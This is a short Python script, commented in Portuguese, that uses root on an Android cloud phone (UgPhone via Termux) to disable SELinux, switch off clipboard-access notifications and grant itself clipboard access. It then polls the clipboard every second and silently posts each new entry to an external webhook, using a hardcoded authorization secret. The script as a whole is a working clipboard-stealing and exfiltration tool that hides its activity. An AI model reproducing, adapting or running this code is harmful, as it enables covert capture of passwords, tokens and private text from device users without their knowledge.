import sys
import time
import subprocess
import requests
import re

# Configurações do seu ecossistema
if len(sys.argv) < 3:
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}

def apply_aggressive_bypass():
    """Tenta explodir todas as travas do UgPhone de uma vez"""
    commands = [
        "setenforce 0", # Desativa o SELinux
        "settings put global settings_clipboard_show_access_notifications 0",
        "appops set com.termux READ_CLIPBOARD allow",
        "dumpsys deviceidle whitelist +com.termux"
    ]
    for cmd in commands:
        subprocess.run(f"su -c '{cmd}'", shell=True, stderr=subprocess.DEVNULL)

def get_clip_via_dumpsys():
    """Extrai o texto do clipboard direto do relatório de dump do sistema"""
    try:
        # O dumpsys clipboard cospe muita coisa. Usamos Regex para pegar apenas o conteúdo.
        cmd = "su -c 'dumpsys clipboard'"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        
        # Procura pelo padrão 'mText=conteúdo' ou 'text="conteúdo"' que o Android usa no dump
        match = re.search(r'mText=(.*)', output)
        if not match:
            match = re.search(r'text="(.*)"', output)
            
        if match:
            result = match.group(1).strip()
            # Limpa resíduos de formatação do dump
            return result.split('{')[0].strip() 
        return ""
    except:
        return ""

def main():
    print("🧨 Iniciando captura agressiva via Dumpsys...")
    apply_aggressive_bypass()
    
    last_clip = get_clip_via_dumpsys()
    
    while True:
        try:
            current = get_clip_via_dumpsys()
            
            # Se o texto existe e é diferente do anterior
            if current and current != last_clip:
                print(f"🔥 Peguei: {current[:40]}...")
                
                payload = {
                    "texto": current, 
                    "device_id": DEVICE_ID, 
                    "guild_id": GUILD_ID
                }
                
                # Envio silencioso
                requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                last_clip = current
            
            # Polling rápido
            time.sleep(1) 
            
        except KeyboardInterrupt:
            break
        except:
            time.sleep(2)

if __name__ == "__main__":
    main()
